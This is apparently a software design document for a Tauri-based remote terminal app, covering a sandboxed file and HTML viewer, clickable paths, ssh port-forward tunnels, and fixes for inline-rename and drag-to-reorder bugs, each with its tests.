    `cap+1` lets us detect truncation (got more than cap ⇒ `truncated=true`, capped to cap).
  - Runs off the terminal's `-CC` control channel entirely (a fresh ssh, like probeTmux) — the
    control stream is a command protocol and must not be polluted with `cat`.
- **`save_file(data_b64, suggested_name) -> { ok, path }`** — `tauri-plugin-dialog` save dialog,
  then write the decoded bytes. (Future **`write_remote_file`** = "upload to override".)

### `fileviewer` tab kind (renderer)
- Registered via the existing `registry.registerTabKind({ kind: 'fileviewer', create })`.
- `create(spec, ctx)` returns a `TabContent` whose `mount()` renders per detected type:
  - **text/code:** into `textContent` (NEVER `innerHTML`) inside a `<pre>` — untrusted content.
  - **markdown:** a **minimal, safe** renderer (headings/lists/code/links/emphasis) that emits
    escaped HTML only — no raw-HTML passthrough. (Keep it small; no heavy MD lib day one.)
  - **image:** `<img src="data:<mime>;base64,…">`.
  - **over cap / binary:** a panel with the size + a Download button, no content render.
- It has **no tmux window** — this is the key difference from terminal tabs. Tab bookkeeping must
  distinguish app-local tabs from window-backed ones: **switch/close of a fileviewer tab must NOT
  emit tmux `select-window`/`kill-window`.** (Give viewer tabs a synthetic id like `view:<n>` and
  gate the tmux calls on the id being a real `@N` window.)

### The `path` plugin change
Today it copies + status. It becomes: call `ctx.openViewer(meta.id, text)`. For a **local** session
(no remote host) the same command path still works (ssh not needed → read the file directly; a
`kind:'local'` branch). Falls back to copy+status if the fetch fails (unreachable, not a file).

### HTML preview — self-contained files (added after the first cut)
Clicking a `.html`/`.htm`/`.xhtml` path previews the page itself. This is different in kind from
every other mode: markdown/text are *transpiled or escaped by us*, but here **the file's own markup
is the render**, so it goes to the browser parser. The whole design is therefore about containing it.

There are two modes. **Static is the default and is what a click gets you**; scripts are a separate,
explicit, per-file opt-in (next subsection). The toolbar always says which is in effect
(`scripts disabled` / `scripts ENABLED`) so an inert page reads as intended rather than as a bug.

- **Static: `<iframe class="fv-html" sandbox="" srcdoc="…">`.** Two INDEPENDENT layers, each
  measured to be sufficient on its own in a real WKWebView:
  1. `sandbox=""` — no `allow-scripts` (no JS), no `allow-same-origin` (opaque origin: no access to
     our DOM/`localStorage`, no reach to `window.__TAURI__` / the `invoke` bridge), no
     `allow-popups`, no `allow-top-navigation`, no `allow-forms`.
  2. The app CSP (`script-src 'self'`) is **inherited by the srcdoc document**, so inline `<script>`
     and inline event handlers (`onerror=`, `onload=`) are blocked even if the sandbox attribute were
     loosened later by mistake.
- **`srcdoc`, not a `blob:` URL.** `blob:` is a separate origin that `default-src 'self'` refuses to
  load as a frame — measured: the frame stays blank. `srcdoc` also means nothing is fetched by URL.
- **Static covers the target case fully.** Static exports — pandoc, `jupyter nbconvert --to html`,
  coverage/plot reports with inlined images — render completely (own `<style>`, embedded `data:`
  images, tables) with nothing executing.
- **CSP addition this required:** `img-src 'self' data:` and `font-src 'self' data:`. Note the
  original CSP (`default-src 'self'` only) **blocked `data:` images outright**, so the pre-existing
  `.png`/`.jpg` image preview never actually displayed; this fixes that too.
- **No relative subresources.** A self-contained file is the contract: `<img src="./logo.png">`
  won't resolve (no base URL, and fetching siblings would mean more remote round-trips per asset).
  Files that depend on adjacent assets render without them — Download still gets the raw bytes.
- **Sizing: the iframe fills the tab, and that depends on a tab-machinery contract.** `.fv-root` is a
  `display:flex` column (toolbar `flex:none`, `.fv-body { flex:1 }`, `.fv-html { height:100% }`), so
  the preview stretches with the window and the file scrolls *inside* the frame. This only works if
  nothing forces an inline `display` on the tab element: `showActiveTab` therefore reveals a tab by
  **clearing** the inline value (`display = ''`), not by setting `'block'`. An inline `display:block`
  outranks the stylesheet, which destroys the flex column and collapses the iframe to the CSS default
  **150px** no matter how tall the tab is (measured: 150px inside a 618px tab). Terminal tabs are
  plain divs, so `''` resolves to the block they already had. TC-FV16 guards the viewer's half of the
  contract (no inline `display` on the root/body/iframe).

### Scripts: an explicit per-file opt-in on a separate origin
Real-world "HTML report" files are often not static at all — the motivating example was a data-model
doc whose single inline `<script type="module">` pulls eight packages from `esm.sh` (React, mermaid,
`@xyflow/react`, …) and builds the entire page at runtime. Statically it renders as an empty shell.
So the viewer offers an **`Enable scripts` button**, and only that button — never a click on the
path, never a remembered preference — turns scripts on, for **that one document, in that one tab**.

- **Why a custom `buoyhtml:` protocol and not a looser iframe attribute.** A `srcdoc` child
  **inherits** the parent document's CSP, and a child can only ever **intersect** a CSP, never relax
  it. Making srcdoc content scriptable would therefore require `'unsafe-inline'` on the **app's own**
  `script-src` — and the app renders untrusted terminal output, so that trades a contained problem
  for app-origin XSS. Instead `enable_html_scripts` stashes the bytes under a random 128-bit token
  and returns `buoyhtml://localhost/<token>`; `register_uri_scheme_protocol` serves it as its **own
  origin** with its own per-response `Content-Security-Policy`, so the permission applies to that
  document alone. See `src-tauri/src/html_preview.rs`.
- **What the preview CSP grants** (and nothing else): `default-src 'none'` as the base, then
  `script-src 'unsafe-inline' 'unsafe-eval' https:`, `style-src`/`font-src`/`img-src`/`media-src`/
  `connect-src` over `https:` (+ `data:`/`blob:` where relevant). No `'self'`, no plaintext `http:`,
  `frame-src 'none'`, `form-action 'none'`, `base-uri 'none'`. Responses also carry
  `Referrer-Policy: no-referrer` (nothing about the user leaks to the CDNs) and `nosniff`.
  Any-HTTPS rather than a CDN allowlist was a deliberate call: an allowlist is unmaintainable and
  gives a false sense of safety, since the granted capability (fetch code from the internet) is the
  same either way.
- **Still cross-origin, still no IPC.** The frame gets `allow-scripts` but **not**
  `allow-same-origin`, so its origin stays opaque — and wry injects the Tauri bootstrap into the
  **main frame only**, so the bridge simply isn't there. Measured against a deliberately hostile
  file driven through the same opt-in path: `__TAURI__`/`__TAURI_INTERNALS__`/`window.ipc` all
  `undefined`, `invoke` throws, `parent.document` / `top.location` / `localStorage` all
  `SecurityError`, `document.origin === "null"`, a fetch of the app origin is blocked, and a planted
  `secret_command` was never reached. `https:` fetches do succeed — that is the capability granted.
- **One live scripted document at a time.** `PreviewStore::put` clears previous entries, so a long
  session can't accumulate multi-MB documents and a closed tab's URL stops resolving (404).
- **Not persisted, not inherited.** Reopening the same path starts static again (TC-FV14). The app's
  own `script-src 'self'` is unchanged; the only app-CSP edit is `frame-src 'self' buoyhtml:`.
- **Verified on the motivating file end-to-end** in a real WKWebView, driving the shipped
  `fileViewerTab.ts` under the shipped CSP: static → 0 scripts ran; after the click → inline script
  ran, the 8 `esm.sh` imports resolved, and the page built **9198 DOM nodes / 24 React-Flow nodes /
  33 SVGs** with its real title.

### Security
- Path is base64-wrapped end-to-end → no shell injection via the clicked text.
- Rendered text is inserted as `textContent`; markdown renderer escapes and never passes raw HTML;
  images are `data:` URLs — so hostile file *contents* can't script the webview (CSP stays
  `script-src 'self'`).
- HTML previews are double-contained (sandboxed opaque iframe + inherited CSP) — see above. The
  iframe's isolation attributes are asserted in CI (TC-FV11), including that hostile markup never
  reaches an app-origin `innerHTML`.
- Script execution for an HTML preview requires an explicit per-file click and runs on a **separate
  origin** (`buoyhtml:`) with its own CSP — the app's `script-src 'self'` is never loosened. The
  frame keeps `allow-scripts` **without** `allow-same-origin`, so it cannot reach the `invoke`
  bridge. CI asserts the opt-in cannot happen implicitly (TC-FV12), that the scripted frame stays
  cross-origin (TC-FV13), and that the choice does not leak to another tab (TC-FV14).
- Connection params come from the validated store, not the renderer.
- Size caps bound memory/DOM blowups from huge or hostile files.

### Testing
- Rust unit: base64 path/content round-trip; truncation detection at the cap boundary; type
  detection (ext + binary sniff).
- Live: fetch a known remote text file, a markdown file, and a small image; assert content/round-
  trip and that truncation triggers past the cap. Save-file writes correct bytes locally.
- Renderer: fileviewer tab open/switch/close does NOT emit tmux window commands (isolation from
  the terminal tabs).

### Deferred (explicitly not in the first cut)
Split-pane layout, syntax highlighting, rich/large markdown libs, **upload-to-override**
(`write_remote_file`), diffing, and re-fetch/watch. (JS-enabled HTML preview *was* deferred; it now
exists as the opt-in above.)

---

## 17. Clickable bare/relative paths — resolve against the pane cwd (Tauri branch)

Makes `ls`-style output clickable and opens relatives correctly.

- **Matcher (`ui/src/builtinPlugins.ts`):** besides slash paths + `~//./..`, also match bare filenames
  **with an extension** (`README.md`), relative paths with an interior slash + extension
  (`src/main.rs`), and known extension-less names (`Makefile`, `Dockerfile`, `LICENSE`, `README`).
  Plain words (no slash, no extension, not known) stay unmatched to avoid underlining noise.
- **Resolution (backend, server-side):** the `read_remote_file` ssh exec resolves a relative path
  against the session's ACTIVE-PANE cwd — it queries tmux `#{pane_current_path}` and joins, in the
  same remote script. Absolute passes through; `~`/`~/` expand to `$HOME`. cwd never leaves the
  backend. Non-file targets error to a status message (no tab).
- Gotcha (verified): POSIX `${p#~/}` does NOT strip a leading `~/` (the `~` is literal in the
  pattern) — must escape it as `${p#\~/}`.

---

## 18. Clickable URLs + localhost port-forwarding (Tauri branch)

A URL in remote output that points at the remote's loopback (`localhost:3000`) can't be opened by
the local browser as-is — it would hit the Mac's port 3000. Like cmux, we open an on-demand
`ssh -L` tunnel to the remote loopback and point the browser at the LOCAL tunnel URL.

### Click behavior (locked)
- **Plain click = smart:**
  - loopback URL (`localhost`/`127.0.0.1`, configurable) → open/reuse an `ssh -L` tunnel, then open
    the LOCAL tunnel URL (`http://localhost:<localPort>/<path>`) in the default browser.
  - any other URL → open in the default browser (unchanged).
- **Shift+Cmd+click** → a small chooser: open-local-via-tunnel / copy URL / open-as-plain.

### Tunnel model (Rust)
- `open_forwarded_url(sessionId, url)`: parse remote host+port+path; pick a free local port; if a
  tunnel for (session, remotePort) already exists, REUSE it, else spawn
  `ssh [port/baseArgs] -o ExitOnForwardFailure=yes -N -L <local>:localhost:<remote> <host>`
  (a SEPARATE ssh process — never the `-CC` channel or the supervisor's connection); then return
  the local URL for the browser.
- Tunnels are tracked per session in a `TunnelRegistry`; **torn down when the session is
  closed/killed** (session_close/session_kill). Reused across clicks to the same remote port.
- Connection params (host/port/baseArgs) come from the VALIDATED store, not the renderer. The
  remote port is validated numeric; the path is percent-encoded/appended safely.

### Config
`loopbackHosts` (default `["localhost","127.0.0.1"]`) in a small `config.json` in the app data dir
— no settings UI yet, but the seam exists (add `0.0.0.0` etc. there). Loaded at startup.

### Security
- Only opens `http`/`https` local tunnel URLs; scheme-validated like `open_external`.
- ssh argv is built from validated store fields; the local port is app-chosen (not user text).
- Tunnels bind to `127.0.0.1` locally (not `0.0.0.0`) so only this machine can use them.

### Sticky local ports + reconnect restore (shipped bug, reported)
> "Keep the ssh -L ports, don't pick a new port every time. now every time if the connection broke,
> the system will pick a new port, this will cause the old page not working anymore, also, when the
> main session reconnected, reconnect the kept ssh -L tunnel as well"

Two separate defects, both in the reconnect path:

**1. The local port moved on every re-open.** `PortRec.local` was already persisted, but `ensure()`
never read it back — it called `free_local_port()` unconditionally. That's invisible while a tunnel
lives and fatal the moment one dies: **a forwarded URL names exactly one `localhost:<local>`**, and
once the user has it in a browser tab (or a bookmark, or a config file, or a curl in their history),
handing out a fresh random port on the next connect silently breaks every one of them. The page
doesn't error usefully — it just stops loading, pointing at a port nothing is listening on.

The fix is `pick_local_port(sticky)`: prefer the port this `(session, remote)` was last forwarded
on, and abandon it **only** if something else now holds it (checked with a real
`TcpListener::bind` — the same check ssh's own listener makes, surfaced early so we fall back
instead of spawning an `ssh -L` doomed to die on `ExitOnForwardFailure=yes`). `local: 0` is serde's
default and means "unknown", never "port 0".

Two lifecycle rules make the memory actually last:
- `close_session` (detach / drop / network death) **kills the children and clears `pid`, but keeps
  `local`.** That asymmetry is the whole feature: the record has to outlive the ssh process, because
  the ssh process is what dies.
- `close()` — the user explicitly dismissing a port row — **removes the row entirely.** Dismissed
  means dismissed; it must not resurrect on the next reconnect.
- The record is on disk, so the port also survives an app restart.

**2. Nothing re-opened the tunnels after a reconnect.** The forwards are deliberately separate ssh
processes (never the `-CC` channel), so a network drop kills them while the supervisor quietly
reconnects the control channel. Previously nothing noticed: the user was left with greyed-out port
rows and dead browser tabs until they re-clicked every port by hand.

`TunnelRegistry::reestablish(session, host, base_args)` re-opens them. It is driven off the
**persisted list, not the live map** — precisely because the live entries are the ones that just
died with the network; reading the live map would find nothing to restore. Already-alive tunnels are
left alone (`ensure` reuses them), so it's safe to call on every reconnect. One port failing (remote
server gone, local port stolen by another app) is logged and skipped, never allowed to abort the
rest.

Wired in `create_session`'s state sink, gated by `should_restore_tunnels(state, seen, host)` —
extracted next to `choose_mode` so the *policy* is unit-testable even though the sink closes over a
live `AppHandle` and isn't. Three conditions, each load-bearing:
- **`Connected` only.** `Connecting`/`Reconnecting` have no usable link yet; spawning then would
  just fail.
- **NOT the first `Connected`.** The initial attach must leave persisted-but-closed ports *inactive
  and re-openable*, not silently spawn an ssh per remembered port at startup. `seen.swap(true)`
  latches the first one — and must run for **every** `Connected`, so it stays ahead of the host
  check rather than short-circuiting past it.
- **Non-empty host.** A local session has no remote to forward from.

The restore runs on its own thread (each forward spawns an ssh child; the sink runs on the
supervisor's thread and blocking it would stall the state machine it reports for), and that thread
uses `try_state`, not `state()` — it's detached and can outlive app teardown, where `state()`
panics. Same precedent as the `buoyhtml` scheme handler. It finishes with `emit_tunnels` so the
sidebar repaints grey → live immediately instead of waiting for the 5s probe tick. No renderer
change was needed: `api.onTunnels` already re-renders.

### Testing
- Unit: URL classification (plain vs loopback + port/path parse); free-port pick; registry
  reuse/teardown.
- Unit (sticky ports, TC-TP1–6 in `tunnel.rs`): `pick_local_port` prefers/abandons correctly;
  `local` survives death + restart but not an explicit `close()`; `ensure()` returns the SAME port
  after the previous tunnel died; `reestablish` restores all persisted ports on their original local
  ports and skips dismissed ones; and the chosen port actually reaches the `-L` flag — asserted via
  `tunnel_argv`, split out of `spawn_tunnel` for exactly this reason, since returning the right
  number from `ensure()` is worthless if the argv carries a different one.
  TC-TP3/4/5 use `dt-sticky-test.invalid` (unresolvable per RFC 6761) so each ssh spawns and dies
  instantly — a deterministic stand-in for "the connection broke", with no network dependency.
- Unit (restore policy, TC-TR1 in `lib.rs`): `should_restore_tunnels` fires on the 2nd+ `Connected`
  only, never on `Connecting`/`Reconnecting`/`Closed`, never for an empty host.
- Live: start a server on the remote loopback, click its `localhost:PORT` URL, assert the tunnel
  opens and the local URL serves the same content; second click reuses the tunnel; session close
  tears it down.
- Live (`live_tunnel_keeps_local_port_across_a_break`, `#[ignore]`): two remote servers, break the
  connection, `reestablish`, assert both come back on their pre-break local ports and the pre-break
  URLs still serve — plus that a `close()`d port is not resurrected.

Mutation-verified (deliberately break the product code, confirm a test fails):

| Mutation | Caught by |
|---|---|
| `ensure` picks a random local port again | TC-TP3, TC-TP4, TC-TP5 |
| `close_session` clears `local` along with `pid` | TC-TP2, TC-TP4 |
| `reestablish` reads the live map instead of the persisted list | TC-TP4, TC-TP5 |
| no first-connect latch (restore on the initial attach too) | TC-TR1 |
| restore also fires on `Reconnecting` | TC-TR1 |
| `-L` built with a different port than `ensure` returned | TC-TP6 |

### Deferred
Tunnels-list UI, idle timeout, `0.0.0.0` default, HTTPS-to-remote, and non-HTTP forwards.

## 23. Inline rename — state-driven editors, because click precedes dblclick

### The bug (shipped and reported: "when double click, the rename not enabled")
Both rename affordances — double-click a sidebar project name, double-click a tmux-window tab label —
appeared wired correctly and did nothing. The `ondblclick` handler *did* fire; the editor simply never
became usable.

The cause is event **ordering**, not wiring. A double-click delivers three events in order:

```
click (detail=1) → click (detail=2) → dblclick
```

The row's `onclick` calls `mount()` → `renderSidebar()`, which rebuilds the list with
`sessionsEl.innerHTML = ''`. So both clicks land *before* `dblclick`, and each one discards every row
node. By the time `dblclick` ran, the `nameEl` its handler had closed over was an orphan. The old
`startRename(id, nameEl)` then did exactly what it was written to do — created an `<input>`, appended
it to `nameEl`, called `.focus()` — into a subtree no longer in the document. Result: an input that
exists, reports itself focused, and is invisible and untypable. The same applies to the tab strip,
where `switchTab()` → `renderTabs()` rebuilds the strip.

Measured in a real Chromium (`A dblclick fired on gen=2 (current gen=3)`,
`input.isConnected=false visible=false focused=false`).

### Why this survived to a user report
A synthetic `el.dispatchEvent(new MouseEvent('dblclick'))` **passes against the broken code**: it
skips the two `click` events entirely, so nothing re-renders and the closed-over node is still live.
Only a real click sequence — click 1, click 2, then `dblclick`, as the OS delivers — can observe the
defect. Any test for this class of bug must preserve that event ordering.

### The fix: the edit is view state, not a DOM node a handler mutates
The rename *intent* lives on the view (`v.renaming` / `v.renameDraft` / `v.renameSel` /
`v.renameFocus`; `tab.*` for tabs), and `renderSidebar`/`renderTabs` **rebuild** the editor from that
state on every render. Inverting ownership this way turns a re-render from the thing that destroys the
editor into the thing that re-materializes it in the live row:

- `startRename(id)` sets state and re-renders. It no longer receives, or touches, a node.
- `mountRenameInput(v, nameEl, id)` is called *from the render path*, so it runs again on every
  subsequent render while the edit is open.
- `commitRename(id, save)` clears state, re-renders, then sends. It early-returns unless
  `v.renaming` — `blur` fires after Enter/Escape already committed, and without that guard a
  committed rename is sent twice.

This matters beyond the double-click: `renderSidebar()` also runs on things the user didn't do — a
`session:state` event (§5.1), the 5s tunnel refresh (§18), a reconnect. Under the old design any of
those would silently destroy an open editor mid-typing. So the draft **and the caret** are mirrored
into the view on `input`/`keyup`/`select`, and a rebuilt input restores value, selection, and focus.
Without the caret half, a re-render would jump the cursor to the end of what the user was typing.

Focus is applied in a `requestAnimationFrame`: the node is in the tree synchronously, but a rAF also
survives the *second* click of the double-click re-rendering the row underneath it.

### Two deliberate behaviors, not oversights
- **The first click of a double-click still mounts the project** (ordinary single-click behavior), so
  renaming an inactive row also switches to it. Suppressing that would mean delaying **every** row
  click by the double-click threshold to see whether a second arrives — a latency cost on the common
  gesture to save a click on the rare one. Documented and asserted, not silently accepted.
- **The second click must not mount again.** `li.onclick` returns early on
  `e.detail >= 2 && nameEl.contains(e.target)`; without it, one double-click issues two `mount()`
  calls — a duplicate `setLastActive` round-trip and, on an unconnected project, a duplicate connect.
  Measured: `["s2","s2"]` instead of `["s2"]`. The tab strip has the same guard; there it is
  redundant with `switchTab`'s `activeWindow === winId` early-out (either alone suffices — verified by
  mutating both), but the intent reads better stated at the gesture than inferred from a downstream
  no-op.

### Empty value means different things in the two editors
Project rename treats empty as **cancel** (a project must keep a label). Tab rename treats empty as
**meaningful** — it clears the manual name so tmux resumes `automatic-rename` for that window — so it
sends on any change from current, including to `""`.

### Testing (`test/gui-rename.ts`, real Tauri platform webview, 41 checks)
Loads the **real** Vite build of `ui/index.html`, `ui/src/tauri-api.ts`, and `ui/src/renderer.ts` in a test-only Tauri binary,
then drives the interaction through the embedded Tauri WebDriver. It is not in the `npm test` glob
(`test/*.test.ts`); run it directly:

```
npm run gui-rename
```

- **TC-R1** the active row's editor is present, **connected**, visible, seeded, focused. `connected`
  is the assertion that pins the actual bug.
- **TC-R2** type + Enter commits exactly once and repaints the label.
- **TC-R3** Escape closes the editor and sends nothing.
- **TC-R4** an inactive row renames too; the editor and the commit target the double-clicked row
  (not the previously-active one); the gesture mounts that row exactly **once**.
- **TC-R5** the tab strip: editor live/visible/focused; the tab is selected exactly once.
- **TC-R6** Enter reaches tmux (`rename-window`) and closes the editor.
- **TC-R7** a `session:state` event for the *other* project arriving mid-typing leaves the draft, the
  caret, and focus intact, and the edit still commits.

Mutation-verified — each piece of the fix was deliberately broken and the suite failed:

| Mutation | Result |
|---|---|
| drop `mountRenameInput` call from `renderSidebar` | 16 FAIL |
| drop `mountTabRenameInput` call from `renderTabs` | 5 FAIL |
| drop `e.detail >= 2` guard in `li.onclick` | 1 FAIL (TC-R4 double mount) |
| drop **both** tab guards (`e.detail >= 2` + `switchTab` early-out) | 1 FAIL (TC-R5 double select) |
| seed the input from `meta.title` instead of the mirrored draft | 2 FAIL (TC-R7) |
| stop mirroring the caret (`renameSel`) | 1 FAIL (TC-R7 caret jumped 4 → 10) |

## 24. Drag-to-reorder — pointer events, because native DnD never reaches the page

### The bug (shipped and reported)
> "Fix the reorder of the sessions. now when drag the session card, it shows a "+" icon below the
> mouse, and the card not movable,. it should be when drag the card, the ui ether show a placeholder
> of the target slot or move other cards damatically"

Three symptoms, one cause: a `+` (copy) badge under the cursor, a card that doesn't move, and — the
part that identifies the culprit — `dragover`/`drop` **never firing in JS at all**. §20 had
implemented reordering with HTML5 drag-and-drop (`li.draggable = true` plus `dragstart` /
`dragover` / `drop` handlers painting a `.drop-before` / `.drop-after` insertion line). Those
handlers were never reached.

### Root cause: the drag is answered by the native view, above us
`wry` subclasses `WKWebView` to implement Tauri's file-drop feature and overrides the
`NSDraggingDestination` methods (`wry-0.55.1/src/wkwebview/drag_drop.rs:53`). Its `dragging_updated`
calls the registered handler and, **if that returns true, returns `NSDragOperation::Copy` without
ever forwarding to `super`'s `draggingUpdated`** (`drag_drop.rs:76`) — and Tauri's handler ends in a
bare `true` (`tauri-runtime-wry-2.11.4/src/lib.rs:4895`). So **every** drag over the webview, from
anywhere including the page itself, is answered "copy" and never forwarded on to WebKit's own drag
machinery. (The `false` branch does call `super` and preserves WebKit's answer — but nothing ever
takes it.)

That is precisely the reported triad. The `+` is `NSDragOperationCopy` rendered by AppKit; the card
can't move because WebKit never runs a drag session for it; and no DOM drag event fires because the
native destination consumed the sequence. **No arrangement of frontend code can fix that path** — the
interception sits above the page. (`"dragDropEnabled": false` in `tauri.conf.json` is the documented
workaround, but it is a global capability switch that would disable file-drop app-wide; the frontend
rewrite below costs nothing and leaves native config and capabilities untouched.)

### The fix: implement dragging on pointer events
Pointer events are ordinary input; the native drag machinery never sees them. So `wirePointerDrag`
in `ui/src/renderer.ts` drives the gesture directly, shared by the project list (`axis: 'y'`) and the tab
strip (`axis: 'x'`):

```
pointerdown  -> arm; remember the origin. Do NOT start — a click must stay a click.
pointermove  -> past DRAG_THRESHOLD (4px): lift the element, snapshot geometry, follow the pointer,
                shift the siblings out of the way
pointerup    -> commit(from, to); or, if never started, fall through to the click handler
pointercancel-> abandon, restoring the strip; persist nothing
```

This also answers the second half of the request directly, and better than the old path could: the
dragged card lifts and tracks the cursor while the items between its old and new slot slide by
exactly one slot. **The gap they open IS the placeholder** — no insertion line needed (which is all
HTML5 DnD could ever have drawn; it has no way to express "move the other cards").

### Load-bearing details, each measured rather than assumed
- **Move/up/cancel are on `window`, not the element**, installed per gesture and removed together in
  `endDrag`. Two reasons, both probed in this webview: the lifted card must have
  `pointer-events:none` (or it hit-tests itself while sitting under the cursor), and that stops
  element-level `pointermove` **completely** (element-moves 2 → 0 once lifted); and
  `setPointerCapture` does not hold here — `hasPointerCapture` reads back false in all four
  capture × lift combinations. Window listeners got every move in every combination. They also
  survive the element being replaced by a re-render mid-gesture.
- **`dropIndexAt` counts midpoints, not slot arithmetic**, because sidebar rows genuinely differ in
  height (a project with forwarded ports is taller).
- **It is fed rects snapshotted at drag start.** We shift siblings with CSS transforms and
  `getBoundingClientRect` reports transformed boxes, so live reads would measure the layout our own
  feedback just changed, mid-transition. Measured honestly: for one- and two-slot drags live rects
  happen to give the *same* landing index, because displaced items move away from the pointer. The
  snapshot is the version whose correctness doesn't depend on that coincidence — not a fix for an
  observed failure.
- **`slotSize` measures the gap edge-to-edge** from a neighbour's snapshotted rect
  (`next.top - me.bottom`), so unequal row heights still yield the true gap, with a fallback to the
  bare extent if the layout gives a nonsense one.
- **`DRAG_THRESHOLD`** is what keeps a click a click: below it `d.started` stays false and `endDrag`
  returns early, leaving the row's `onclick` to select the project.
- **`pointercancel` abandons.** `clearDragStyles` is what makes that actually restore the strip,
  since a cancelled drag never re-renders.
- **The tab strip's reorderable set is `.tab:not(.plus)`** — the trailing `+` is an affordance, not a
  tab, and must neither shift nor be a drop target.
- **Commits are index-based** (`reorderProjectByIndex`, `reorderTabByIndex`, replacing §20's
  id-relative pair) because the landing slot may be one past the last item, which no
  "before/after this id" form can name. Both bounds-check against a list that changed mid-drag.
- **The press is exempt on `input, .controls, .tunnel, .tclose, .plus`** and on any row with a live
  rename editor (`el.querySelector('input')`). The second guard was found by probing §23 against
  §24: pressing a renaming row's *sub-line* — outside the editor, so not covered by the first
  guard — used to lift and reorder it, even though `li.onclick` already ignores clicks while
  renaming. The two paths should agree.
- **`li.draggable = true` is deliberately gone**, with a comment saying why: setting it hands the
  gesture straight back to the native machinery that swallows it.
- **The post-drag click-swallow is insurance, not a proven fix.** A completed drag can still be
  followed by a `click`, which would also switch project. It's swallowed at the window in the capture
  phase, because that's where the click lands — measured in Chromium, the post-drag click targets the
  *container*, since the lifted card's `pointer-events:none` keeps it from being the mouseup target
  and puts the down/up common ancestor at the container. On that same measurement the guard is
  **redundant in Chromium**: no row handler receives the click either way, and removing it fails no
  test. It is kept for the shipping engine, WKWebView, which is not Chromium and which nothing in
  this repo can exercise. The code comment says so explicitly so nobody later reads the passing
  tests as proof it's load-bearing.

### No text selection while dragging (second report, after the reorder itself worked)
> "the reorder works, but whhile moving, the text on other cards will be selected. we should avoid
> selection."

Press-and-move over text is *also* the native gesture for extending a selection, so the drag has to
suppress it. The first cut did this reactively — `user-select:none` under `.reordering` — and that is
**too late**: a `pointerdown` places a selection anchor immediately (measured: `type: "Caret"`, one
range, at mouseDown), while `.reordering` only appears after the 4px threshold has classified the
gesture. Flipping `user-select` mid-gesture does not reliably abort a selection drag already in
flight — Chromium stops extending, which is why the local suite didn't catch it, but WKWebView is
what ships and it kept going.

So the rule is **unconditional** on both strips (`#sessions`, `#tabs`), with the rename editors opting
back in (`input { user-select:text; }`) so §23 doesn't regress. These are chrome labels; nobody
selects them.

`onDragMove` additionally clears an anchor the press may have left, but **scoped to `d.container`** —
not a bare `removeAllRanges()`. The unscoped version was written first and probing caught it wiping a
selection planted in the terminal area: a reorder must not throw away output the user had selected.
On the same measurement the clear is redundant in Chromium (no caret is set at all once
`user-select:none` is unconditional) and is kept only as WKWebView insurance; the comment says so.

### Testing (`test/gui-reorder.ts`, real Tauri platform webview, 48 checks)
Same shape as §23's suite and for the same reason: the gesture's difficulty is event sequencing and
hit-testing. WebdriverIO drives down / move × 8 / up sequences against the real `ui/index.html` +
`ui/src/renderer.ts` in Tauri's native webview. The macOS embedded driver currently emits native mouse
events without WebKit's usual PointerEvent promotion, so the suite supplies that narrow test-only
promotion after native hit-testing. Not in the `npm test` glob:

```
npm run gui-reorder
```

Cases: TC-D0 (rows are not HTML5-draggable — the bug's own fingerprint) through TC-D10; see
TEST_PLAN.md for the list.

Every drag travels `pitch + 6`px, not exactly one pitch. `dropIndexAt` compares strictly
(`coord > mid`), so travelling *exactly* one pitch lands the pointer exactly ON the neighbour's
midpoint and nothing moves. Real drags aren't pixel-exact, and that tie shouldn't be what decides a
test — the sidebar happened to pass on it only because its 43px pitch is odd, while the tab strip's
92px pitch did not.

Mutation-verified — each piece was deliberately broken:

| Mutation | Result |
|---|---|
| revert to HTML5 DnD (`draggable=true` + `dragover`/`drop`) | 11 FAIL |
| window listeners → element listeners | 9 FAIL |
| cancel commits instead of abandoning | 5 FAIL |
| remove `DRAG_THRESHOLD` | 2 FAIL |
| don't shift the siblings (no placeholder gap) | 2 FAIL (TC-D3) |
| drop the rename-in-progress guard | 2 FAIL (TC-D9) |
| `user-select:none` reactive (`.reordering`-only) instead of unconditional | 2 FAIL (TC-D10) |
| unscope the anchor clear to a bare `removeAllRanges()` | 1 FAIL (TC-D10 — wipes a selection made elsewhere) |
| include `.plus` in the reorderable set | 1 FAIL (TC-D8) |
| drop the post-drag click-swallow | all ok — proven dead code in Chromium (see above); kept as WKWebView insurance, and the comment says so |
| feed live rects to `dropIndexAt` | all ok — probed; the comment claims only what's measured |
| drop the in-drag anchor clear | all ok — `user-select:none` alone suffices in Chromium; kept for WKWebView |

The three "all ok" rows are recorded rather than hidden. Each was investigated instead of waved away,
and in each case the outcome was to **correct the code comment** to claim only what the tests actually
prove. The anchor-clear mutation is also what exposed the unscoped-`removeAllRanges` regression: asking
"why doesn't this matter?" is what surfaced that the first version mattered in the wrong direction.
